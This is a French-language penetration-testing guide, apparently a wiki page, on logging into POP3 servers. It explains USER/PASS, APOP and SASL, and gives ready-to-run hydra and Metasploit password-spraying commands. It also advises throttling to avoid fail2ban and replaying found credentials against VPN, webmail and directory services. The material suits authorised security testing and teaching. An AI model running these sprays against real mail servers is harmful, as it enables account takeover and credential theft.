---
title: "Authentification : se connecter et pulvériser des identifiants POP3"
description: "S'authentifier auprès de POP3 : le duo USER/PASS en clair, le défi-réponse APOP (MD5 de l'horodatage du message d'accueil plus un secret partagé), SASL AUTH, et la pulvérisation en ligne avec hydra et Metasploit contre le port 995. Lit +OK contre -ERR et explique quand APOP est attaquable hors ligne."
keywords:
  - pop3 login
  - user pass
  - apop md5
  - pop3 password spray
  - hydra pop3
---

# Authentification

POP3 offre trois voies d'entrée. `USER name` puis `PASS secret` est la valeur par défaut en clair et traverse le réseau à découvert, sauf à être enveloppé dans TLS (995) ou STLS. `APOP name digest` est un défi-réponse : le condensé est `MD5(timestamp + shared-secret)` sur le jeton issu du message d'accueil, de sorte que le mot de passe ne voyage jamais, mais une paire jeton/condensé capturée est cassable hors ligne. `AUTH <mechanism>` exécute SASL (PLAIN, LOGIN, CRAM-MD5) à peu près comme IMAP. Un `+OK` après l'étape d'identifiant est une connexion réussie ; `-ERR` est un rejet. Comme pour tout compte de messagerie, le succès est presque toujours réutilisable ailleurs.

## Prérequis

Exécutez `CAPA` et lisez d'abord le message d'accueil ([énumération](enumeration.md)). L'absence de `STLS` sur le port 110 et l'absence de 995 signifient que `USER`/`PASS` est en clair (pertinent pour l'interception). Un jeton APOP dans le message d'accueil signifie qu'APOP est proposé.

## Connexion manuelle

```bash
openssl s_client -connect <target>:995 -quiet
USER alice
+OK
PASS Sprint2025!
+OK Logged in.
```

Le `+OK Logged in.` est un identifiant valide et une session ouverte que vous pouvez enchaîner directement vers l'[accès à la boîte aux lettres](mailbox-access.md). `-ERR` après `PASS` est un mauvais mot de passe (ou, sur les serveurs plus anciens, un utilisateur inconnu).

## APOP

Lorsque le message d'accueil porte `<1896.697170952@mail.corp.local>`, la réponse APOP pour un secret partagé connu est le MD5 du jeton concaténé avec le mot de passe :

```bash
# token from the greeting, password=Sprint2025!
printf '<1896.697170952@mail.corp.local>Sprint2025!' | md5sum
# -> c4c9334bac560ecc979e58001b3e22fb  -
nc <target> 110
APOP alice c4c9334bac560ecc979e58001b3e22fb
+OK maildrop has 12 messages
```

APOP est utile de deux manières offensivement : vous pouvez tester hors ligne des mots de passe candidats contre lui si vous capturez une véritable ligne `APOP` (le jeton est dans le message d'accueil, le condensé est sur le réseau), et sa présence signale un serveur plus ancien méritant une identification de version pour l'[exploitation du serveur](server-exploitation.md). SASL `CRAM-MD5` se comporte de façon similaire : une paire défi/réponse capturée est une cible de cassage hors ligne.

## Pulvérisation

```bash
# one password across validated users, implicit TLS on 995
hydra -L users.txt -p 'Sprint2025!' -s 995 -S <target> pop3 -t 4 -f
# single account, short contextual list
hydra -l alice -P top-passwords.txt -s 995 -S <target> pop3 -t 4 -f
# Metasploit's POP3 login scanner as an alternative driver
msfconsole -qx 'use auxiliary/scanner/pop3/pop3_login; set RHOSTS <target>; set USER_FILE users.txt; set PASS_FILE pass.txt; run; exit'
```

`-S` sélectionne le TLS implicite (995) ; pour le port 110 en clair, retirez-le. Gardez un faible nombre de threads et une liste courte et contextuelle : les serveurs POP3 journalisent les échecs et sont couramment protégés par fail2ban, de sorte qu'une pulvérisation lente de noms d'utilisateur validés avec des mots de passe dérivés de l'organisation bat une attaque par force brute large.

## Suites

Un identifiant fonctionnel mène à l'[accès à la boîte aux lettres](mailbox-access.md) et devrait être rejoué immédiatement contre IMAP, la soumission SMTP, le webmail, le VPN et l'annuaire.

## Outils

- [hydra](https://github.com/vanhauser-thc/thc-hydra)
- [Scanner pop3_login de Metasploit](https://www.rapid7.com/db/modules/auxiliary/scanner/pop3/pop3_login/)

## Références

- [RFC 1939 : USER/PASS et APOP](https://datatracker.ietf.org/doc/html/rfc1939#section-7)
- [RFC 1734 : commande AUTH de POP3](https://datatracker.ietf.org/doc/html/rfc1734)
- [HackTricks : pentesting POP](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-pop.html)
